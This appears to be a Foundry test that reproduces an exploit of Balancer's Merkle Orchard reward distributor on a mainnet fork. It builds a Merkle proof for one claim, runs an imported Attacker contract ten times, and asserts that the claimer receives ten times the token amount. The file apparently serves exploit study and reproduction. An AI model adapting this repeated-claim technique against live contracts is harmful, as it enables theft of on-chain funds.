// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/interfaces/IERC20.sol";
import "../../src/balancer-merkle-orchard-jan2023/Attacker.sol";

contract AttackerTest is Test {
    address claimer = 0x57b18C6717a2B1dCf94351d7C6167691425737DC;

    function setUp() public {
        // fork 1 block before tx 0x7f80cc306ba86a25be806df13264e3c7e8363f0295c822fa302378bd38ab0727
        vm.createSelectFork("mainnet", 15837792);
    }

    function testAttack() public {
        bytes32[] memory proof = new bytes32[](12);
        proof[0] = 0x9dfbf7c918518b3c96befc9c7178f9d85dbec75baa1457749780710cb6e2fab0;
        proof[1] = 0x1459513ce0fe343354d5b941644785b433c84e85f34e6e7297171d5deb2d0035;
        proof[2] = 0x0a93097cb9138ab1e9493e56fac429b3f6ebbfc3d031ce591fcfafebf0398105;
        proof[3] = 0x4c548b15158eec039a1d74232928311f35b2693185e1d7a2f72c9e7e1a6b147a;
        proof[4] = 0x9f7de89db5d55efdf394df915d9ab5d26956556c1da07612e7e1f0794faa3301;
        proof[5] = 0x736a792a76e0f66913ca5cc9e5eedee3f405748023a900719ec2d92aae5be80f;
        proof[6] = 0xd8d331ef8c777b3d480a42eba19343c481b1e17557f3b5e4988a3e9f634363b0;
        proof[7] = 0x02ad7733b927e3d8bd7b3414a4e989a189775646c10cdf2a4d79b93d8740be04;
        proof[8] = 0x018614a70e3e29575ebb9187ec872c6151f852978fcb390c6fb24ef3614c9b15;
        proof[9] = 0xae927f79f6ed27bf45ef3fadbcbf1228814b33380f20d3a64fb2b726702941e9;
        proof[10] = 0x6ed645d9b5a25b02e2671f9745ba560c736329e8f1767baf98c52a2df1da8ff1;
        proof[11] = 0xdd5933661c2b5728dcaf0f3f96893d66f1ed0457288e2d3cf738b324f4761a5b;

        uint claimAmount = 5_568_441_214_478_000_000;

        Claim memory claim = Claim({
            distributionId: 52,
            balance: claimAmount,
            distributor: 0xd2EB7Bd802A7CA68d9AcD209bEc4E664A9abDD7b,
            tokenIndex: 0,
            merkleProof: proof
        });

        IERC20 balToken = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);

        uint preBalance = balToken.balanceOf(claimer);
        console.log("Claimer bal balance pre attack: %s", preBalance);

        // Attack!
        uint repetitions = 10;
        Attacker attacker = new Attacker();
        attacker.attack(claimer, claim, balToken, repetitions);

        uint postBalance = balToken.balanceOf(claimer);
        console.log("Claimer bal balance post attack: %s", postBalance);

        assertEq(postBalance - preBalance, repetitions * claimAmount);
    }
}
